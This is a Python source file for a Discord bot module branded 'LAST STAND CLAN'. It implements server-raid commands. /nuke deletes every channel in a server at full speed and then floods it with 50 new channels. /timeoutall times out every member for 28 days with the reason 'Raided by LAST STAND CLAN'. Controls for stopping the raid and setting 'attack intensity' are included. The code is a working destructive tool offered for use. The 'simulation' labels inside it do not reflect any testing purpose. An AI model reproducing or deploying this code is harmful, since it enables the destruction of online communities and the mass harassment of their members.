"""
control.py — LAST STAND CLAN | /stop, /setratelimit, /status, /nuke, /timeout
"""

import asyncio
import datetime
import random

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

RAID_TAG   = "LAST STAND CLAN"
RAID_SHORT = "LSC"
SEM_DELETE = 30
SEM_TIMEOUT = 20


class Control(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /stop ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="stop", description="Immediately stop all running operations.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def stop(self, interaction: discord.Interaction) -> None:
        if not bot_state.active_simulation and not bot_state.is_running():
            await interaction.response.send_message("No operation is currently running.", ephemeral=True)
            return

        simulation = bot_state.active_simulation or "unknown"
        count = len(bot_state.running_tasks)
        bot_state.stop_all()

        await interaction.response.send_message(
            f"🛑 **Stopped — {RAID_TAG}**\n"
            f"┣ Operation : `{simulation}`\n"
            f"┗ Cancelled : `{count}` tasks",
        )

    # ── /setratelimit ──────────────────────────────────────────────────────────
    @app_commands.command(name="setratelimit", description="Change attack intensity live (1–10).")
    @app_commands.describe(level="1 = slowest, 10 = instant.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def setratelimit(self, interaction: discord.Interaction, level: int) -> None:
        if not 1 <= level <= 10:
            await interaction.response.send_message("❌ Level must be 1–10.", ephemeral=True)
            return

        bot_state.rate_controller.set_intensity(level)
        ctx = "(applied to running operation)" if bot_state.active_simulation else "(next operation)"

        await interaction.response.send_message(
            f"⚙️ **Rate updated** {ctx}\n"
            f"┗ {bot_state.rate_controller.describe()}",
            ephemeral=True,
        )

    # ── /status ────────────────────────────────────────────────────────────────
    @app_commands.command(name="status", description="Show current operation status.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def status(self, interaction: discord.Interaction) -> None:
        rc = bot_state.rate_controller
        if bot_state.active_simulation:
            msg = (
                f"📊 **Running: `{bot_state.active_simulation}`** — {RAID_TAG}\n"
                f"┣ {rc.describe()}\n"
                f"┗ Active tasks: `{len(bot_state.running_tasks)}`"
            )
        else:
            msg = (
                f"📊 **Idle** — {RAID_TAG}\n"
                f"┗ {rc.describe()}"
            )
        await interaction.response.send_message(msg, ephemeral=True)

    # ── /nuke ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="nuke",
        description="☢️ Delete every channel and category in the server instantly.",
    )
    @app_commands.describe(
        rebuild="After nuking, create 50 flood channels. Default True.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def nuke(self, interaction: discord.Interaction, rebuild: bool = True) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        guild = interaction.guild
        assert guild is not None

        bot_state.reset()
        bot_state.rate_controller.set_intensity(10)
        bot_state.active_simulation = "nuke"

        channels = list(guild.channels)
        await interaction.response.send_message(
            f"☢️ **NUKE — {RAID_TAG}**\n"
            f"┣ Deleting : `{len(channels)}` channels\n"
            f"┣ Rebuild  : `{'✅ 50 flood channels' if rebuild else '❌'}`\n"
            f"┗ `/stop` cancels.",
        )

        task = asyncio.create_task(self._run_nuke(guild, channels, rebuild))
        bot_state.add_task(task)

    async def _run_nuke(
        self, guild: discord.Guild, channels: list, rebuild: bool
    ) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        try:
            await asyncio.gather(
                *[self._delete_ch(ch, sem) for ch in channels],
                return_exceptions=True,
            )
            if rebuild and not bot_state.stop_event.is_set():
                sem_c = asyncio.Semaphore(20)
                await asyncio.gather(
                    *[self._create_flood_ch(guild, i, sem_c) for i in range(50)],
                    return_exceptions=True,
                )
        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "nuke":
                bot_state.active_simulation = None

    async def _delete_ch(self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await ch.delete()
            except discord.HTTPException:
                pass

    async def _create_flood_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await guild.create_text_channel(f"lsc-flood-{idx}")
            except discord.HTTPException:
                pass

    # ── /timeout ───────────────────────────────────────────────────────────────
    @app_commands.command(
        name="timeoutall",
        description="⏱️ Timeout every member for 28 days simultaneously.",
    )
    @app_commands.describe(
        skip_admins="Skip admins. Default False.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def timeoutall(self, interaction: discord.Interaction, skip_admins: bool = False) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        guild = interaction.guild
        assert guild is not None

        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != interaction.user.id
            and (not skip_admins or not m.guild_permissions.administrator)
        ]

        if not targets:
            await interaction.response.send_message("No eligible members found.", ephemeral=True)
            return

        bot_state.reset()
        bot_state.rate_controller.set_intensity(10)
        bot_state.active_simulation = "timeoutall"

        await interaction.response.send_message(
            f"⏱️ **MASS TIMEOUT — {RAID_TAG}**\n"
            f"┣ Targets  : `{len(targets)}`\n"
            f"┣ Duration : `28 days`\n"
            f"┗ `/stop` halts immediately.",
        )

        task = asyncio.create_task(self._run_timeout(targets))
        bot_state.add_task(task)

    async def _run_timeout(self, members: list[discord.Member]) -> None:
        sem = asyncio.Semaphore(SEM_TIMEOUT)
        duration = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, duration, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "timeoutall":
                bot_state.active_simulation = None

    async def _timeout_one(
        self, member: discord.Member, duration: datetime.timedelta, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await member.timeout(duration, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ── Error handlers ─────────────────────────────────────────────────────────
    @stop.error
    @setratelimit.error
    @status.error
    @nuke.error
    @timeoutall.error
    async def _missing_perms(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message("❌ You need **Administrator** permission.", ephemeral=True)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Control(bot))
